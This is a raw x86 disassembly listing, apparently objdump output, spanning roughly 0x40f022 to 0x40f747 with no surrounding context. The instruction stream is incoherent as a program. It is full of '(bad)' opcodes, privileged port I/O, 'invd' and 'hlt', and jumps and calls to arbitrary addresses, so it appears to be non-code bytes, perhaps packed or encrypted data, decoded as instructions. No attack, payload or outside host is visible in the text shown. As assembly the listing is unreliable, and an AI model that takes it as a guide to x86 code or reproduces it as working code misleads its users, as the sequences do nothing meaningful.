  40f022:	or     BYTE PTR [edx],0x16
  40f025:	xor    bl,BYTE PTR [eax-0x68c58e72]
  40f02b:	push   cs
  40f02c:	jb     0x40f089
  40f02e:	push   ebx
  40f02f:	xor    BYTE PTR [eax+0x4bc2c0ce],ch
  40f035:	and    ebp,0xb2c3e1c6
  40f03b:	push   ebp
  40f03c:	add    BYTE PTR [ebx+0x3d517d1a],0x1c
  40f043:	xchg   ecx,eax
  40f044:	lods   al,BYTE PTR ds:[esi]
  40f045:	stc    
  40f046:	add    bh,ch
  40f048:	out    0x6f,al
  40f04a:	fisttp DWORD PTR [edi]
  40f04c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f04d:	jne    0x40f0ba
  40f04f:	cmp    ah,cl
  40f051:	push   ebx
  40f052:	xor    ebp,DWORD PTR [esi-0x4a]
  40f055:	push   ebp
  40f056:	mov    edx,DWORD PTR [ebx]
  40f058:	mov    edi,DWORD PTR [ebx-0x57bcfeda]
  40f05e:	call   0x3eaf4776
  40f063:	add    eax,0x48bb807f
  40f068:	cmp    BYTE PTR ds:0xdadf179c,bh
  40f06e:	and    esi,ebx
  40f070:	loop   0x40f06f
  40f072:	daa    
  40f073:	jnp    0x40f083
  40f075:	scas   al,BYTE PTR es:[edi]
  40f076:	leave  
  40f077:	push   esi
  40f078:	pop    esp
  40f079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f07a:	inc    ecx
  40f07b:	jae    0x40f082
  40f07d:	scas   eax,DWORD PTR es:[edi]
  40f07e:	in     al,dx
  40f07f:	inc    esp
  40f080:	out    0x51,eax
  40f082:	inc    ecx
  40f083:	fs in  al,dx
  40f085:	jecxz  0x40f087
  40f087:	(bad)  
  40f088:	cld    
  40f089:	mov    edi,0x554a53c
  40f08e:	mov    ch,0xb5
  40f090:	jecxz  0x40f09f
  40f092:	inc    ebp
  40f093:	dec    ecx
  40f094:	invd   
  40f096:	cwde   
  40f097:	dec    ecx
  40f098:	or     ebp,esp
  40f09a:	cmp    BYTE PTR ds:0x9eaacac7,ah
  40f0a0:	loope  0x40f0b3
  40f0a2:	push   es
  40f0a3:	dec    esi
  40f0a4:	jb     0x40f0b1
  40f0a6:	out    dx,al
  40f0a7:	out    0x88,eax
  40f0a9:	xchg   DWORD PTR [ebp-0x717cbff2],edx
  40f0af:	mov    edi,0xfa9f983d
  40f0b4:	mov    ebx,0x84e20e23
  40f0b9:	pop    ebx
  40f0ba:	adc    eax,0x3db20873
  40f0bf:	or     BYTE PTR [edi-0x35f0f0e7],bl
  40f0c5:	in     eax,0x99
  40f0c7:	mov    BYTE PTR [eax],bh
  40f0c9:	sahf   
  40f0ca:	not    BYTE PTR [edi-0x4635b23c]
  40f0d0:	add    BYTE PTR [ecx+0x3ce07b23],0x8f
  40f0d7:	popf   
  40f0d8:	nop
  40f0d9:	cwde   
  40f0da:	out    dx,eax
  40f0db:	bound  ecx,QWORD PTR [eax-0xb82a11b]
  40f0e1:	cmc    
  40f0e2:	add    eax,0x978bf878
  40f0e7:	add    BYTE PTR [edx+0x38],dh
  40f0ea:	push   esi
  40f0eb:	cmp    ebx,DWORD PTR [ebp+0x787a7317]
  40f0f1:	xor    esp,ecx
  40f0f3:	sub    eax,0x3ea01ada
  40f0f8:	gs or  eax,0x9f978a50
  40f0fe:	sbb    eax,0x57fc2c44
  40f103:	stos   DWORD PTR es:[edi],eax
  40f104:	iret   
  40f105:	lods   al,BYTE PTR ds:[esi]
  40f106:	xchg   ebp,eax
  40f107:	push   ds
  40f108:	repz (bad) 
  40f10a:	clc    
  40f10b:	shl    BYTE PTR [ecx],cl
  40f10d:	outs   dx,BYTE PTR ds:[esi]
  40f10e:	pop    ds
  40f10f:	test   BYTE PTR [eax+0x11],al
  40f112:	idiv   ebx
  40f114:	mov    ds:0xf05a28ca,al
  40f119:	ficom  WORD PTR [ecx+ecx*2+0x79]
  40f11d:	out    0x13,eax
  40f11f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f120:	rcr    esp,cl
  40f122:	cmc    
  40f123:	push   ss
  40f124:	pop    edx
  40f125:	xlat   BYTE PTR ds:[ebx]
  40f126:	adc    eax,0x1c999d7b
  40f12b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f12c:	mov    al,BYTE PTR fs:[edx+0x37]
  40f130:	sar    BYTE PTR [ebp+edi*8-0x3c57469d],cl
  40f137:	push   ecx
  40f138:	(bad)  
  40f139:	xor    BYTE PTR ds:[ebp*8+0x403ee0cc],0x52
  40f142:	cmc    
  40f143:	es dec eax
  40f145:	add    BYTE PTR [eax],dl
  40f147:	cmp    eax,0xfcf60803
  40f14c:	pop    es
  40f14d:	mov    bh,0x10
  40f14f:	mov    bh,0xab
  40f151:	xlat   BYTE PTR ds:[ebx]
  40f152:	pushf  
  40f153:	idiv   dl
  40f155:	fadd   QWORD PTR [ebp+0xa]
  40f158:	or     eax,0xd99ed3a5
  40f15d:	push   0xffffff8a
  40f15f:	sahf   
  40f160:	outs   dx,DWORD PTR ds:[esi]
  40f161:	or     BYTE PTR [eax-0x5b],ah
  40f164:	test   DWORD PTR [esi],ebp
  40f166:	push   ss
  40f167:	cmp    BYTE PTR [eax-0x58],dl
  40f16a:	(bad)  
  40f16b:	jge    0x40f1e2
  40f16d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f16e:	mov    edx,DWORD PTR [ebp-0x226bd7ac]
  40f174:	lahf   
  40f175:	out    dx,al
  40f176:	ja     0x40f15f
  40f178:	push   es
  40f179:	inc    edx
  40f17a:	into   
  40f17b:	jmp    0x40f1bd
  40f17d:	mov    BYTE PTR es:[esi+0x1c2f7a5],bh
  40f184:	xchg   DWORD PTR [edi+0x0],ecx
  40f187:	push   es
  40f188:	and    BYTE PTR [ebx+0x7f],dl
  40f18b:	push   esi
  40f18c:	cmp    BYTE PTR [esi+0x452b7c6d],dh
  40f192:	(bad)  
  40f193:	mov    eax,0xf33af6e5
  40f198:	clc    
  40f199:	into   
  40f19a:	dec    ecx
  40f19b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f19c:	inc    eax
  40f19d:	test   al,0xdf
  40f19f:	xor    DWORD PTR [ecx-0x67],esp
  40f1a2:	ss dec eax
  40f1a4:	cdq    
  40f1a5:	push   esp
  40f1a6:	push   esi
  40f1a7:	div    al
  40f1a9:	bswap  eax
  40f1ab:	inc    esi
  40f1ac:	ins    DWORD PTR es:[edi],dx
  40f1ad:	arpl   WORD PTR [eax-0x80],bp
  40f1b0:	xor    bl,bh
  40f1b2:	in     eax,dx
  40f1b3:	in     al,0x74
  40f1b5:	aaa    
  40f1b6:	add    ch,cl
  40f1b8:	and    esp,DWORD PTR [ecx+0x743a4a3c]
  40f1be:	ins    DWORD PTR es:[edi],dx
  40f1bf:	rol    DWORD PTR [ebp-0x1aa588cf],0x8a
  40f1c6:	pushf  
  40f1c7:	cmc    
  40f1c8:	xor    al,0xa8
  40f1ca:	aaa    
  40f1cb:	xor    ah,BYTE PTR [eax+0x22]
  40f1ce:	mov    ds:0xcb53d433,al
  40f1d3:	and    eax,0xffa2a873
  40f1d8:	jmp    edi
  40f1da:	iret   
  40f1db:	leave  
  40f1dc:	ins    BYTE PTR es:[edi],dx
  40f1dd:	icebp  
  40f1de:	das    
  40f1df:	stc    
  40f1e0:	cmp    al,0xfb
  40f1e2:	jbe    0x40f211
  40f1e4:	sbb    dl,BYTE PTR ds:0x956d8275
  40f1ea:	xor    ecx,DWORD PTR [edx+0x28e263cd]
  40f1f0:	int    0x24
  40f1f2:	popf   
  40f1f3:	push   0x74
  40f1f5:	addr16 das 
  40f1f7:	xchg   ebp,eax
  40f1f8:	scas   al,BYTE PTR es:[edi]
  40f1f9:	jg     0x40f252
  40f1fb:	(bad)  
  40f1fc:	ins    BYTE PTR es:[edi],dx
  40f1fd:	dec    eax
  40f1fe:	sub    DWORD PTR [eax+ecx*4-0x7],esi
  40f202:	mov    cl,0x75
  40f204:	xor    ch,cl
  40f206:	mov    ebx,0xbf11f350
  40f20b:	push   cs
  40f20c:	enter  0xa529,0x7c
  40f210:	pop    ebx
  40f211:	pop    DWORD PTR [ebp+0xc]
  40f214:	xlat   BYTE PTR ds:[ebx]
  40f215:	xor    DWORD PTR ds:0xd00eee0c,esi
  40f21b:	jp     0x40f1b5
  40f21d:	push   esi
  40f21e:	push   ecx
  40f21f:	std    
  40f220:	xchg   esp,eax
  40f221:	sub    bl,bh
  40f223:	sub    al,0x85
  40f225:	pop    ds
  40f226:	popf   
  40f227:	dec    ebx
  40f228:	gs in  eax,0xcb
  40f22b:	pop    es
  40f22c:	fld    QWORD PTR [eax+0x3b6e4720]
  40f232:	fld    TBYTE PTR [si+0x14]
  40f236:	fwait
  40f237:	out    dx,eax
  40f238:	add    DWORD PTR [ebp+0xf07dd32],0x7d
  40f23f:	sbb    al,0x31
  40f241:	sub    eax,0xe994f767
  40f246:	pop    edx
  40f247:	add    esi,ebx
  40f249:	leave  
  40f24a:	dec    edi
  40f24b:	iret   
  40f24c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f24d:	inc    esp
  40f24e:	jae    0x40f286
  40f250:	arpl   WORD PTR [ebp+0x63],bp
  40f253:	or     DWORD PTR ds:0x6c53b911,ebx
  40f259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f25a:	imul   ebp,ebp,0x7a
  40f25d:	test   eax,0xc1ce0940
  40f262:	bound  esp,QWORD PTR [ebx-0x67]
  40f265:	push   esi
  40f266:	mov    BYTE PTR [edx],ah
  40f268:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f269:	push   eax
  40f26a:	sbb    BYTE PTR [ebx+0x1ecf3e58],bl
  40f270:	jge    0x40f272
  40f272:	je     0x40f2d6
  40f274:	je     0x40f2a6
  40f276:	push   ebx
  40f277:	rol    BYTE PTR [ecx],1
  40f279:	cmp    DWORD PTR [ebx-0x62],esi
  40f27c:	out    0x5,al
  40f27e:	dec    ebp
  40f27f:	je     0x40f20c
  40f281:	cli    
  40f282:	mov    BYTE PTR [ecx-0x3d],ch
  40f285:	xchg   ecx,eax
  40f286:	jl     0x40f2f7
  40f288:	mov    eax,0x185dc13f
  40f28d:	stc    
  40f28e:	pop    es
  40f28f:	std    
  40f290:	dec    esp
  40f291:	mov    dl,0x94
  40f293:	adc    DWORD PTR [ebx],esi
  40f295:	lods   al,BYTE PTR ds:[esi]
  40f296:	jnp    0x40f248
  40f298:	rcl    dh,0x41
  40f29b:	or     DWORD PTR [edx+0x74],edx
  40f29e:	adc    ch,BYTE PTR [edx]
  40f2a0:	jae    0x40f273
  40f2a2:	xchg   ebp,eax
  40f2a3:	fadd   QWORD PTR [edx+0x75]
  40f2a6:	pop    esi
  40f2a7:	xchg   esp,eax
  40f2a8:	inc    edx
  40f2a9:	push   ecx
  40f2aa:	dec    ebp
  40f2ab:	aas    
  40f2ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2ad:	sub    bl,bl
  40f2af:	cwde   
  40f2b0:	jecxz  0x40f239
  40f2b2:	int    0x83
  40f2b4:	lock fs and dl,dh
  40f2b8:	aam    0x74
  40f2ba:	mov    esp,DWORD PTR [ecx]
  40f2bc:	cs cli 
  40f2be:	mov    ebp,0xc52eac14
  40f2c3:	jl     0x40f2d9
  40f2c5:	rcr    esi,0x56
  40f2c8:	repnz pop esp
  40f2ca:	mov    ebp,0xa04bf85f
  40f2cf:	rol    DWORD PTR [esi+eax*4],cl
  40f2d2:	jo     0x40f2d0
  40f2d4:	push   ds
  40f2d5:	add    BYTE PTR [ebx+0x2e],ch
  40f2d8:	out    dx,eax
  40f2d9:	sahf   
  40f2da:	pop    es
  40f2db:	xchg   ebx,eax
  40f2dc:	(bad)  
  40f2dd:	adc    al,0x42
  40f2df:	in     al,0xe9
  40f2e1:	dec    eax
  40f2e2:	popf   
  40f2e3:	push   0x6fd3176b
  40f2e8:	cmp    DWORD PTR [esi+esi*8+0x5b],ebp
  40f2ec:	and    edx,DWORD PTR [ebx-0x20be2b39]
  40f2f2:	add    BYTE PTR [ebp+0x29509e54],bl
  40f2f8:	or     al,dl
  40f2fa:	jge    0x40f2a1
  40f2fc:	pop    edx
  40f2fd:	push   ss
  40f2fe:	mov    esp,0xa315592c
  40f303:	inc    esi
  40f304:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f306:	xor    BYTE PTR [ebx+0x19],bh
  40f309:	mov    esi,0xed3e8904
  40f30e:	xchg   eax,esi
  40f310:	shr    DWORD PTR [edx-0x77],cl
  40f313:	xchg   esi,eax
  40f314:	jp     0x40f33c
  40f316:	pop    esp
  40f317:	lods   eax,DWORD PTR ds:[esi]
  40f318:	imul   edx,DWORD PTR [eax],0x49292e4a
  40f31e:	in     al,dx
  40f31f:	push   ecx
  40f320:	sbb    eax,0x49667d6e
  40f325:	mov    eax,ds:0xf42dea41
  40f32a:	push   cs
  40f32b:	shl    BYTE PTR [esi-0x5c30d13f],cl
  40f331:	pop    eax
  40f332:	and    DWORD PTR [esi-0x499d26a2],esi
  40f338:	addr16 loopne 0x40f388
  40f33b:	cmc    
  40f33c:	enter  0xe1d7,0xe4
  40f340:	mov    bh,0x9a
  40f342:	pop    ebx
  40f343:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f344:	inc    esi
  40f345:	cmp    DWORD PTR fs:[ebp-0x6d],0x1e9f72aa
  40f34d:	shl    DWORD PTR [ebp-0x33],0x7d
  40f351:	and    esi,DWORD PTR [ecx+0x4a481ea1]
  40f357:	sar    BYTE PTR [edx-0x3],cl
  40f35a:	out    dx,eax
  40f35b:	pushf  
  40f35c:	or     al,0xce
  40f35e:	and    ch,BYTE PTR [eax+0x42726f0b]
  40f364:	ror    DWORD PTR [ebp+eiz*1+0x7bae48d6],1
  40f36b:	jmp    0x40f3da
  40f36d:	mov    eax,DWORD PTR [edi]
  40f36f:	shl    DWORD PTR [ebx-0x2497c0f5],1
  40f375:	lock xor cl,BYTE PTR [edx]
  40f378:	and    dl,ch
  40f37a:	xchg   esp,eax
  40f37b:	inc    ebp
  40f37c:	sbb    al,0xea
  40f37e:	stos   BYTE PTR es:[edi],al
  40f37f:	imul   ecx,DWORD PTR [eax],0x6
  40f382:	adc    BYTE PTR [eax+0x2c],cl
  40f385:	push   cs
  40f386:	cli    
  40f387:	or     BYTE PTR [esi+0x2e],dl
  40f38a:	lods   al,BYTE PTR ds:[esi]
  40f38b:	sbb    ch,dl
  40f38d:	jl     0x40f358
  40f38f:	out    0x46,al
  40f391:	inc    edi
  40f392:	scas   eax,DWORD PTR es:[edi]
  40f393:	popf   
  40f394:	jmp    0x4240:0xddcff14b
  40f39b:	nop
  40f39c:	(bad)  
  40f39d:	jl     0x40f356
  40f39f:	mov    cl,0x12
  40f3a1:	sub    BYTE PTR [ecx],al
  40f3a3:	cmp    bh,dl
  40f3a5:	(bad)  
  40f3a6:	arpl   WORD PTR ds:0x337bcf1f,bp
  40f3ac:	(bad)  
  40f3ad:	and    al,0xff
  40f3af:	fwait
  40f3b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3b1:	fimul  WORD PTR [esi]
  40f3b3:	jno    0x40f365
  40f3b5:	in     al,0x38
  40f3b7:	bound  esp,QWORD PTR [ecx-0x23]
  40f3ba:	mov    ds:0x457a1782,al
  40f3bf:	xor    eax,0x443dab27
  40f3c4:	or     DWORD PTR [edi],edi
  40f3c6:	sti    
  40f3c7:	adc    eax,0xee28f610
  40f3cc:	sti    
  40f3cd:	int    0xa6
  40f3cf:	cmp    al,0x37
  40f3d1:	stos   BYTE PTR es:[edi],al
  40f3d2:	outs   dx,BYTE PTR ds:[esi]
  40f3d3:	jp     0x40f415
  40f3d5:	inc    edx
  40f3d6:	dec    ebx
  40f3d7:	scas   eax,DWORD PTR es:[edi]
  40f3d8:	out    0xb3,eax
  40f3da:	cld    
  40f3db:	pop    esp
  40f3dc:	push   es
  40f3dd:	fild   WORD PTR [edx-0x7d81f822]
  40f3e3:	dec    BYTE PTR [ebp-0x46c59006]
  40f3e9:	pop    ss
  40f3ea:	jb     0x40f3cc
  40f3ec:	or     BYTE PTR [eax+0x4199a096],0x7b
  40f3f3:	add    dl,ch
  40f3f5:	stc    
  40f3f6:	mov    esi,0x413c5c83
  40f3fc:	pop    ecx
  40f3fd:	ja     0x40f44a
  40f3ff:	inc    esi
  40f400:	pop    edi
  40f401:	adc    esp,esi
  40f403:	stc    
  40f404:	lock fcomp DWORD PTR [edi]
  40f407:	cdq    
  40f408:	cdq    
  40f409:	mov    ch,0xff
  40f40b:	adc    al,0xc9
  40f40d:	mov    dl,0xc
  40f40f:	fsubp  st(2),st
  40f411:	pop    ds
  40f412:	dec    edi
  40f413:	cs mov cl,0xa0
  40f416:	mov    edx,0xddb2fa2f
  40f41b:	sbb    eax,0x4f61a70d
  40f420:	mov    esi,0x38c103ef
  40f425:	push   eax
  40f426:	cmp    DWORD PTR [edi+0x46b80038],esi
  40f42c:	call   0xb6b8391b
  40f431:	stos   DWORD PTR es:[edi],eax
  40f432:	mul    DWORD PTR ds:0xcb96b850
  40f438:	push   ecx
  40f439:	gs hlt 
  40f43b:	jge    0x40f3d7
  40f43d:	adc    eax,0x15dc61f9
  40f442:	and    al,0x9e
  40f444:	xadd   BYTE PTR [ebx+ebp*2],al
  40f448:	retf   0x1c5d
  40f44b:	mov    ds:0x23c3f224,eax
  40f450:	jo     0x40f4a1
  40f452:	call   0xc4bc5d4a
  40f457:	sbb    eax,0x551664b6
  40f45c:	mov    ds:0xed6b3af0,eax
  40f461:	mov    WORD PTR [edx-0xeb00025],cs
  40f467:	pop    esi
  40f468:	adc    cl,dh
  40f46a:	dec    edi
  40f46b:	jne    0x40f426
  40f46d:	push   cs
  40f46e:	jl     0x40f40f
  40f470:	dec    edx
  40f471:	sub    eax,0x6e4784a6
  40f476:	adc    al,0x8
  40f478:	add    BYTE PTR [edi+0x53b07a5f],al
  40f47e:	in     al,dx
  40f47f:	inc    esi
  40f480:	stc    
  40f481:	sub    BYTE PTR [ecx+0x41],cl
  40f484:	stos   DWORD PTR es:[edi],eax
  40f485:	pop    edx
  40f486:	push   edi
  40f487:	mov    al,0xe6
  40f489:	sub    DWORD PTR [edi-0x3],esi
  40f48c:	push   edi
  40f48d:	out    0xe1,al
  40f48f:	sbb    al,0x1
  40f491:	iret   
  40f492:	and    dl,BYTE PTR [edx-0x48]
  40f495:	or     ch,BYTE PTR ds:0x1b3ca2ef
  40f49b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f49c:	jb     0x40f436
  40f49e:	xchg   edx,eax
  40f49f:	dec    ebp
  40f4a0:	and    esi,DWORD PTR [eax]
  40f4a2:	lock ds (bad) 
  40f4a5:	jecxz  0x40f44c
  40f4a7:	test   DWORD PTR [ebp+0x3f],ecx
  40f4aa:	pop    es
  40f4ab:	and    al,0xe5
  40f4ad:	or     DWORD PTR [ecx],edx
  40f4af:	lods   al,BYTE PTR ds:[esi]
  40f4b0:	pushf  
  40f4b1:	js     0x40f4c6
  40f4b3:	shl    DWORD PTR [edx+eiz*1-0x106456fd],1
  40f4ba:	xchg   ebx,eax
  40f4bb:	add    BYTE PTR [ebx+0x45b9420],dl
  40f4c1:	je     0x40f51e
  40f4c3:	shl    BYTE PTR [ecx+0x5ee892cd],1
  40f4c9:	or     DWORD PTR [ebx-0x11],ebp
  40f4cc:	call   0xd1f33a45
  40f4d1:	outs   dx,BYTE PTR ds:[esi]
  40f4d2:	mov    cs,WORD PTR [esi]
  40f4d4:	inc    eax
  40f4d5:	sub    cl,BYTE PTR [edx-0x7082fe1a]
  40f4db:	sub    al,0x86
  40f4dd:	jno    0x40f4c8
  40f4df:	inc    ebx
  40f4e0:	jg     0x40f519
  40f4e2:	ret    0x13
  40f4e5:	cmc    
  40f4e6:	stc    
  40f4e7:	inc    esi
  40f4e8:	push   esi
  40f4e9:	cwde   
  40f4ea:	or     DWORD PTR [edi+0x28],eax
  40f4ed:	mov    esi,0xfd4c01d0
  40f4f2:	mov    ch,0xab
  40f4f4:	mov    eax,0xa293bc5b
  40f4f9:	les    esp,FWORD PTR [ebp+0x58]
  40f4fc:	adc    eax,edx
  40f4fe:	test   al,0x37
  40f500:	hlt    
  40f501:	test   al,0xf0
  40f503:	mov    ch,0xbf
  40f505:	jns    0x40f533
  40f507:	cs xchg ebx,eax
  40f509:	cmp    al,0x7f
  40f50b:	sub    eax,0x750d792d
  40f510:	repnz test eax,0x784c520c
  40f516:	inc    edi
  40f517:	pushf  
  40f518:	out    dx,al
  40f519:	or     bl,dh
  40f51b:	add    cl,bl
  40f51d:	mov    BYTE PTR [eax-0x1c],bl
  40f520:	sbb    edi,DWORD PTR [ecx+0x40]
  40f523:	jae    0x40f576
  40f525:	jecxz  0x40f4b8
  40f527:	and    al,0x21
  40f529:	dec    edi
  40f52a:	hlt    
  40f52b:	ret    
  40f52c:	enter  0x5102,0x93
  40f530:	dec    eax
  40f531:	xor    al,0xf8
  40f533:	popa   
  40f534:	pop    esi
  40f535:	sub    al,0x8e
  40f537:	xor    DWORD PTR [edi+0x30ef07a0],eax
  40f53d:	mov    ebx,esp
  40f53f:	mov    DWORD PTR [ebx+0x13],edi
  40f542:	sbb    eax,0xe1fd02ca
  40f547:	jge    0x40f56c
  40f549:	sbb    al,0x97
  40f54b:	arpl   WORD PTR [edx+esi*4-0x3dc2f768],dx
  40f552:	outs   dx,DWORD PTR ds:[esi]
  40f553:	jmp    0x40f562
  40f555:	sahf   
  40f556:	jbe    0x40f55e
  40f558:	jns    0x40f504
  40f55a:	add    al,0x60
  40f55c:	out    0x74,al
  40f55e:	mov    bh,0x74
  40f560:	hlt    
  40f561:	inc    ebx
  40f562:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f563:	ins    DWORD PTR es:[edi],dx
  40f564:	mov    DWORD PTR [ebp-0x733c91fd],esi
  40f56a:	mov    ecx,0xbb7bab7a
  40f56f:	dec    edi
  40f570:	add    DWORD PTR [ebx],esp
  40f572:	aas    
  40f573:	pop    esi
  40f574:	adc    eax,0x5231fc31
  40f579:	jle    0x40f5b8
  40f57b:	lock shr BYTE PTR [edx],0xa7
  40f57f:	or     DWORD PTR [ebx],ebp
  40f581:	dec    edx
  40f582:	mov    bh,0x59
  40f584:	cmc    
  40f585:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f586:	sbb    DWORD PTR [esi+0x3f20f311],ebp
  40f58c:	mov    al,ds:0xe7d4d37c
  40f591:	sbb    al,0xeb
  40f593:	xchg   esi,eax
  40f594:	pop    ecx
  40f595:	cmp    al,0xd9
  40f597:	mov    bl,0xa5
  40f599:	jo     0x40f53c
  40f59b:	pop    edx
  40f59c:	mov    edx,0x8cac999
  40f5a1:	inc    eax
  40f5a2:	sub    DWORD PTR [ebp-0x1e],ecx
  40f5a5:	es stos DWORD PTR es:[di],eax
  40f5a8:	push   ecx
  40f5a9:	push   ebp
  40f5aa:	mov    ds:0x2ec38d39,eax
  40f5af:	sahf   
  40f5b0:	bound  eax,QWORD PTR [ecx-0x424e0d5a]
  40f5b6:	mov    dh,0xfa
  40f5b8:	or     edi,DWORD PTR [ebp-0x55388841]
  40f5be:	imul   esp,DWORD PTR [eax],0xc2bb9488
  40f5c4:	repnz and al,0xf
  40f5c7:	adc    DWORD PTR [ebx],ebx
  40f5c9:	dec    esp
  40f5ca:	lods   eax,DWORD PTR ds:[esi]
  40f5cb:	cwde   
  40f5cc:	lds    ebp,FWORD PTR [eax]
  40f5ce:	inc    esp
  40f5cf:	or     dl,al
  40f5d1:	sub    DWORD PTR [ebx-0x3e26c7ac],edi
  40f5d7:	jl     0x40f639
  40f5d9:	stos   DWORD PTR es:[edi],eax
  40f5da:	stos   DWORD PTR es:[edi],eax
  40f5db:	int    0x77
  40f5dd:	mov    WORD PTR gs:[ecx],ds
  40f5e0:	jae    0x40f5fe
  40f5e2:	cmc    
  40f5e3:	fmul   DWORD PTR [ecx-0x1e]
  40f5e6:	or     dl,al
  40f5e8:	in     eax,0x87
  40f5ea:	fnstcw WORD PTR [ebx+0x39aa01a5]
  40f5f0:	cmc    
  40f5f1:	ss js  0x40f5a3
  40f5f4:	(bad)  
  40f5f5:	ja     0x40f5d2
  40f5f7:	lods   al,BYTE PTR ds:[esi]
  40f5f8:	sti    
  40f5f9:	clc    
  40f5fa:	stos   DWORD PTR es:[edi],eax
  40f5fb:	add    BYTE PTR [ebx],ah
  40f5fd:	dec    esp
  40f5fe:	in     al,0x8b
  40f600:	inc    DWORD PTR [edi-0x1a]
  40f603:	mov    edi,DWORD PTR [edx-0x5c]
  40f606:	and    esp,edi
  40f608:	mov    ch,0x8c
  40f60a:	setge  BYTE PTR es:[ebp-0x1c313874]
  40f612:	arpl   WORD PTR [ebp-0x4],ax
  40f615:	lods   al,BYTE PTR ds:[esi]
  40f616:	mov    es,WORD PTR [ebp+0x5dd49d4d]
  40f61c:	call   0x5053:0x6c2342f0
  40f623:	and    BYTE PTR [esi],0xa0
  40f626:	cmc    
  40f627:	mov    esi,0xf955917
  40f62c:	dec    esi
  40f62d:	xchg   esp,eax
  40f62e:	mul    ah
  40f630:	mov    ds:0xc7c4114a,eax
  40f635:	lahf   
  40f636:	pop    edi
  40f637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f638:	pop    edx
  40f639:	xchg   ebx,eax
  40f63a:	dec    edx
  40f63b:	pushf  
  40f63c:	fisttp DWORD PTR es:[eax]
  40f63f:	add    ebp,DWORD PTR [edi-0x4c1e1d57]
  40f645:	mov    WORD PTR ds:[esp+eax*1],gs
  40f649:	sbb    BYTE PTR [esi-0x5e],0x8a
  40f64d:	test   BYTE PTR [eax],0x5b
  40f650:	aad    0xb7
  40f652:	aaa    
  40f653:	cmp    DWORD PTR [edx+edi*4+0x7c6d2fc0],ebx
  40f65a:	repz jo 0x40f618
  40f65d:	xchg   edi,eax
  40f65e:	push   esi
  40f65f:	xchg   esi,eax
  40f660:	das    
  40f661:	and    esp,DWORD PTR [esi+0x2df6560b]
  40f667:	jge    0x40f5f0
  40f669:	or     al,BYTE PTR [ecx+0x7b]
  40f66c:	jecxz  0x40f698
  40f66e:	mov    al,ds:0xac95b0ab
  40f673:	mov    al,ds:0x601d457e
  40f678:	ficomp WORD PTR ds:0xf91744d2
  40f67e:	or     BYTE PTR [ebx],bl
  40f680:	jne    0x40f627
  40f682:	int3   
  40f683:	xchg   ecx,eax
  40f684:	stos   DWORD PTR es:[edi],eax
  40f685:	and    ch,dl
  40f687:	mov    bl,BYTE PTR [ebx-0x1b]
  40f68a:	add    BYTE PTR [ecx-0x2afc3456],ch
  40f690:	cmp    DWORD PTR [ebp-0x32f5a70d],0xfbce806d
  40f69a:	xor    al,BYTE PTR [ebx]
  40f69c:	rcl    BYTE PTR [ebx+0x24002adc],0xd6
  40f6a3:	xchg   esi,eax
  40f6a4:	dec    edi
  40f6a5:	adc    BYTE PTR [ecx+edx*2+0x799ea11f],bh
  40f6ac:	sub    dh,al
  40f6ae:	jmp    0x1c3:0x7d0574d5
  40f6b5:	add    dh,cl
  40f6b7:	add    dl,BYTE PTR [ebx]
  40f6b9:	jecxz  0x40f6af
  40f6bb:	mov    ebp,0xab4eeb90
  40f6c0:	test   BYTE PTR [ecx],bl
  40f6c2:	mov    ch,0x40
  40f6c4:	outs   dx,DWORD PTR ds:[esi]
  40f6c5:	sub    BYTE PTR [eax+0x29021171],dl
  40f6cb:	mov    ds:0x1b7bb537,eax
  40f6d0:	pop    ds
  40f6d1:	sbb    edx,DWORD PTR [ebp-0x51]
  40f6d4:	and    al,0x49
  40f6d6:	xchg   esi,eax
  40f6d7:	mov    BYTE PTR [eax+0x25],ch
  40f6da:	inc    esi
  40f6db:	jns    0x40f703
  40f6dd:	nop
  40f6de:	dec    ecx
  40f6df:	mov    ebp,0x7308fac
  40f6e4:	cmp    eax,esi
  40f6e6:	mov    DWORD PTR [eax+esi*2+0x1a8c9e2a],ecx
  40f6ed:	dec    edx
  40f6ee:	sahf   
  40f6ef:	imul   edx,DWORD PTR [ecx-0x6502f865],0xffffffff
  40f6f6:	xchg   BYTE PTR [edx-0x1],ah
  40f6f9:	pop    ds
  40f6fa:	das    
  40f6fb:	push   edx
  40f6fc:	xchg   ecx,edx
  40f6fe:	and    DWORD PTR [ecx-0x60],0x7e
  40f702:	xchg   esp,eax
  40f703:	(bad)  
  40f704:	loopne 0x40f6fe
  40f706:	mov    eax,ds:0x98cdde51
  40f70b:	retf   
  40f70c:	sbb    eax,0xd19fa4cb
  40f711:	xchg   ecx,eax
  40f712:	outs   dx,DWORD PTR ds:[esi]
  40f713:	push   ds
  40f714:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f715:	inc    ebx
  40f716:	mov    WORD PTR [esi+0x7],ss
  40f719:	mov    edx,0x30616614
  40f71e:	jmp    0x40f6f2
  40f720:	xchg   esi,eax
  40f721:	cmp    eax,DWORD PTR [esi+0x11]
  40f724:	xchg   DWORD PTR [eax-0x4f],ecx
  40f727:	dec    ebp
  40f728:	xchg   bh,dl
  40f72a:	mov    edi,0x55494092
  40f72f:	aas    
  40f730:	push   ds
  40f731:	fidiv  WORD PTR [edi-0x494ab254]
  40f737:	sub    al,0x40
  40f739:	push   0x193aadbd
  40f73e:	inc    esp
  40f73f:	stos   BYTE PTR es:[edi],al
  40f740:	popf   
  40f741:	inc    ecx
  40f742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f743:	test   al,0x50
  40f745:	mov    cl,0x10
  40f747:	pop    ds
